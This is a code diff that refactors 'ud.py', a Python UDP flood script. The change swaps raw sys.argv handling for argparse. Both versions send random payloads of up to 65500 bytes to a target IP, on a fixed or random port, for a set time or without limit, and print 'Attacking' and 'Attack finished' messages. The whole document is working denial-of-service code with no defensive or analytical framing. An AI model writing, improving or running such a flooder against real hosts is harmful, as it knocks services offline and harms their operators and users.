@@ -1,52 +1,51 @@
+from time import time as tt
+import argparse
 import socket
 import random
-import time
 import os
-import sys
 
-if len(sys.argv) == 1:
-	sys.exit('\n\033[1;37mRequired arguments are missing. Use: \033[1;36mpython ud.py <ip> <port> <time> <size>\033[1;37m\nYou could pass 0 for port, time & size. (random ports, unlimited time, 1024 bytes)\nExample: \033[1;36mpython ud.py 1.3.3.7 0 0 0 \033[1;37mor \033[1;36mpython ud.py 1.3.3.7 80 30 65500\033[1;m\n')
+def attack(ip, port, time, size):
 
-def check(x):
-	if not x != 0:
-		return False
-	else:
-		return True
+    if time is None:
+        time = float('inf')
 
-def UDP():
+    if port is not None:
+        port = max(1, min(65535, port))
 
-	ip = str(sys.argv[1])
-	port = int(sys.argv[2])
-	randomport = check(port)
-	timed = int(sys.argv[3])
-	unlimitedtime = check(timed)
-	sbytes = int(sys.argv[4])
-	nobytes = check(sbytes)
+    fmt = 'Attacking {ip} on {port} for {time} with a size of {size} bytes.'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports',
+        time='{time} seconds'.format(time=time) if str(time).isdigit() else 'unlimited time',
+        size=size
+    )
+    print(fmt)
 
-	if nobytes is True:
-		if sbytes < 512 or sbytes > 65530:
-			print("\n\033[1;37mSize value can't be lower than 512 or higher than 65530.\033[1;m\n")
-			return
+    startup = tt()
+    size = os.urandom(min(65500, size))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or random.randint(1, 65535)
 
-	startup = time.time()
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
 
-	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-	bytes = os.urandom((1024, sbytes)[nobytes])
-	print("\n\033[1;37mAttacking \033[1;36m{0} \033[1;37mon \033[1;36m{a} \033[1;37mfor \033[1;36m{b} \033[1;37mwith a size of \033[1;36m{c} \033[1;37mbytes.\nCancel it with CTRL+C at any time.\033[1;m\n".format(ip, a="random ports" if port==0 else "port {0}".format(port), b="unlimited time" if timed==0 else "{0} seconds".format(timed), c=(1024, sbytes)[nobytes]))
-	timed = (9999, timed)[unlimitedtime]
-	while True:
-		port = (random.randint(1, 65535), port)[randomport]
-		endtime = time.time()
-		if (startup+timed) < endtime:
-			break
-		else:
-			sock.sendto(bytes,(ip, port))
-	print("\n\033[1;37mAttack finished.\033[1;m\n")
+        sock.sendto(size, (ip, port))
 
-if __name__ == "__main__":
-	try:
-		UDP()
-	except KeyboardInterrupt:
-		print("\n\033[1;37mThe program has been stopped.\n\033[1;m")
-	except IndexError:
-		print("\n\033[1;37mRequired arguments are missing.\n\033[1;m")
+    print('Attack finished.')
+
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser(description='Usage: python ud.py <ip> <port> <time> <size>')
+
+    parser.add_argument('ip', type=str, help='IP or domain to attack.')
+    parser.add_argument('-p', '--port', type=int, default=None, help='Port number.')
+    parser.add_argument('-t', '--time', type=int, default=None, help='Time in seconds.')
+    parser.add_argument('-s', '--size', type=int, default=1024, help='Size in bytes.')
+
+    args = parser.parse_args()
+
+    try:
+        attack(args.ip, args.port, args.time, args.size)
+    except KeyboardInterrupt:
+        print('Attack stopped.')
